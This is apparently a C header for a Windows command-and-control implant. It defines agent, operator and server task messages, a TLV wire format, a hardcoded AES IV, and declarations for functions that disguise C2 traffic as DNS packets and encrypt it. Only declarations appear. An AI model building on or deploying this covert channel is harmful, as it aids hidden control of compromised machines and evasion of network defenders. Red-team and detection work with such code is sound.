#pragma once
#pragma comment(lib, "bcrypt.lib")
#include <WinSock2.h>
#include <Windows.h>
#include <stdlib.h>
#include <bcrypt.h>

#include "debug.h"
#include "error.h"
#include "network.h"

#define TLV_HEADER_SIZE 8
#define MAX_MESSAGE_SIZE 65536
#define DNS_HEADER_SIZE 12
#define DNS_FLAGS_OFFSET 2
#define DNS_LENGTH_OFFSET 4
#define DNS_ANSWER_OFFSET 6
#define DNS_AUTHORITY_OFFSET 8
#define DNS_ADDITIONAL_OFFSET 10
#define KEY_SIZE 32
#define KEY_BUFF_SIZE 44
#define IV_SIZE 16

#define MSG_AGENT_GET_TASK 0x1001
#define MSG_AGENT_POST_RESULT 0x1002
#define MSG_OPERATOR_SUBMIT_TASK 0x1003
#define MSG_OPERATOR_GET_RESULT 0x1004
#define MSG_SERVER_NO_TASK 0x1005
#define MSG_SERVER_TASK 0x1006
#define MSG_SERVER_ACK 0x1007
#define MSG_SERVER_RESULT 0x1008
#define MSG_SERVER_PENDING 0x1009
#define STATUS_SUCCESS 0x00000000

#define DEFAULT_AGENT_ID 1
#define DEFAULT_POLL_INTERVAL_MS 5000

#define IV {0xf0, 0x01, 0x98, 0xcb, 0xd6, 0x53, 0x0e, 0x36, 0xb5, 0xe1, 0x0d, 0x16, 0xb2, 0xe1, 0xf7, 0xb6}

typedef struct _TLV_MESSAGE
{
	DWORD type;
	DWORD length;
	PBYTE value;
} TLV_MESSAGE;

typedef struct _AGENT_GET_TASK_REQUEST
{
	DWORD agentId;
} AGENT_GET_TASK_REQUEST;

typedef struct _TASK_HEADER
{
	DWORD taskId;
	DWORD commandId;
	DWORD argLength;
} TASK_HEADER;

typedef struct _TASK_RESULT_HEADER
{
	DWORD agentId;
	DWORD taskId;
	DWORD commandId;
	DWORD status;
	DWORD resultLength;
} TASK_RESULT_HEADER;

/**
 * @brief Sends a raw TLV message using the shared wire format.
 *
 * @param sock The active C2 socket used to send the message.
 * @param taskId The taskId sent as a DNS transaction ID
 * @param type The TLV message type.
 * @param payloadLength The number of payload bytes to send.
 * @param payload The optional payload buffer.
 *
 * @return TRUE on success, or FALSE if the send fails.
 */
BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength, CONST PBYTE payload);

/**
 * @brief Receives a full TLV message from the active socket.
 *
 * On success, the payload buffer is heap allocated and must later be freed by
 * calling FreeTlvMessage.
 *
 * @param sock The active C2 socket to read from.
 * @param msg Receives the decoded TLV message.
 *
 * @return TRUE on success, or FALSE if the receive fails or the message is invalid.
 */
BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg);

/**
 * @brief Frees the heap-owned payload buffer inside a TLV message.
 *
 * @param msg The TLV message whose payload buffer should be released.
 *
 * @return VOID
 */
VOID FreeTlvMessage(TLV_MESSAGE* msg);

/**
* @brief encodes a TLV message as DNS and encrypts the body
* 
* @param msg The msg to be masked
* 
* @param taskId The identifier assigned to the relevant task
* 
* @param type The type of message or task to send
* 
* @param payloadLength The length of the payload to encode
* 
* @param payload The payload to encode
* 
* @return TRUE on success, FALSE on failure
*/
BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYTE payload);

/**
* @brief decodes a DNS-masked message to TLV format
* 
* @param msg The DNS-masked message to decode
* 
* @param out The output buffer
* 
* @return TRUE on success, FALSE on failure
*/
BOOL DecodeDNS(PBYTE msg, PBYTE* out);

/**
* @brief Encrypts a message using AES CBC-mode
* 
* @param msg The message to be encrypted
* 
* @param msgLength The length of the message
* 
* @return TRUE on success, FALSE on failure
*/
BOOL Encrypt(PBYTE* msg, DWORD msgLength);

/**
* @brief Decrypts a message using AES CBC-mode
* 
* @param msg The message to be encrypted
* 
* @param msgLength The length of the message
* 
* @return TRUE on success, FALSE on failure
*/
BOOL Decrypt(PBYTE msg, DWORD* msgLength);